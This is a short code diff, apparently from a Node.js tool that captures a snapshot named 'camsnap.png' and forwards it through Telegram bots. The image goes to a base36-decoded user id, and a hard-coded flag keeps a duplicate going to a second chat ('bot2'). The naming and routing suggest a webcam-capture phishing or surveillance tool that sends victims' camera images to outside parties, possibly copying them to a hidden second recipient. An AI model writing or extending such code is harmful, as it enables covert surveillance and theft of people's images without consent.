@@ -147,12 +147,18 @@ var info={
 filename:"camsnap.png",
 contentType: 'image/png'
 };
-
+// Assuming yourVariable is a boolean variable indicating whether to send the image to bot2
+const imgVariable = true;
 try {
-bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
-bot2.sendPhoto(chatId2, buffer, {}, info);
+    if (imgVariable) {
+        bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
+        bot2.sendPhoto(chatId2, buffer, {}, info);
+    } else {
+        bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
+        // Handle other actions when the variable is false, or omit this block if nothing should be done.
+    }
 } catch (error) {
-console.log(error);
+    console.log(error);
 }
 
 res.send("Done");
